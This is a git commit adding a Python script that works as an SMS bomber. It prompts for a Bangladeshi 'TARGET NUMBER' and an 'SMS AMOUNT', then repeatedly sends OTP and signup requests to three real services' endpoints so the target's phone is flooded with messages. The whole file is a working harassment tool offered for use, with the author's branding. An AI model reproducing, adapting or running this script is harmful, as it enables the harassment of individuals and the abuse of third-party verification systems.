fe7c7964727b9a29520fb8d087ba2a124e0a6c77
BAYGID89 <136146833+BAYGID89@users.noreply.github.com>
2023-06-10 11:46:48 +0600

    Add files via upload

---
+++ BAYGID-sms1.py
@@ -0,0 +1,104 @@
+import os
+print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] EMRAN CYBER (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
+os.system("pkg install espeak")
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] ROBOT INSTALL COMPLETE \033[1;30m")
+os.system('espeak -a 300 "Robot install complete"')
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS EMRAN CYBER KING EMRAN\033[1;30m")
+os.system("git pull")
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("xdg-open https://www.facebook.com/md.baygid.1428")
+logo3=("""
+\033[1;99m╔════════════════════════════════════════════════════════════════════╗    
+\033[1;92m█  ______        _     ____  ____   ______  _____  ______    
+\033[1;93m█ |_   _ \      / \   |_  _||_  _|.' ___  ||_   _||_   _ `.  
+\033[1;94m█   | |_) |    / _ \    \ \  / / / .'   \_|  | |    | | `. \ 
+\033[1;95m█   |  __'.   / ___ \    \ \/ /  | |   ____  | |    | |  | | 
+\033[1;96m█  _| |__) |_/ /   \ \_  _|  |_  \ `.___]  |_| |_  _| |_.' / 
+\033[1;97m█ |_______/|____| |____||______|  `._____.'|_____||______.'                                                           
+\033[1;99m╚════════════════════════════════════════════════════════════════════╝
+\033[1;94m[+]===============================================================[+]
+\033[1;94m[+]\033[1;32m               CREATED BY   :  BAYGID                                       \033[1;94m[+]
+\033[1;94m[+]\033[1;32m               ON GITHUB    :  BAYGID                          \033[1;94m[+]
+\033[1;94m[+]\033[1;32m               TOOL VERSION :  7.2                             \033[1;94m[+]
+\033[1;94m[+]\033[1;32m               NETWORK      :  4G,5G                           \033[1;94m[+]
+\033[1;94m[+]\033[1;32m               TOOL STATUS  :  FREE                            \033[1;94m[+]
+\033[1;94m[+]\033[1;32m               TOOL'S NAME  :  RANDOM CLONING                  \033[1;94m[+]
+\033[1;94m[+]\033[1;32m               COUNTRY      :  BANGLADESH                      \033[1;94m[+]
+\033[1;94m[+]===============================================================[+]
+
+""")
+
+print(logo3)
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+headers2={
+         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
+         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers3={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46m BAYGID  SMS WAS SENT🐼")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46m BAYGID  SMS WAS SENT🐼")
+  else:
+    pass
+  
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+  if send3.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46m BAYGID  SMS WAS SENT🐼")
+    
+  else:
+    pass
+os.system("clear")
+print(""" \033[1;32m
+
+      \033[38;5;46m██████╗  █████╗ ██╗   ██╗ ██████╗ ██╗██████╗ 
+      \033[38;5;47m██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝ ██║██╔══██╗
+      \033[38;5;48m██████╔╝███████║ ╚████╔╝ ██║  ███╗██║██║  ██║
+      \033[38;5;49m██╔══██╗██╔══██║  ╚██╔╝  ██║   ██║██║██║  ██║
+      \033[38;5;46m██████╔╝██║  ██║   ██║   ╚██████╔╝██║██████╔╝
+      \033[38;5;46m╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝╚═════╝                                            
+                            
+ TNQ FOR USING OUR TOOLS 🖤
+""")
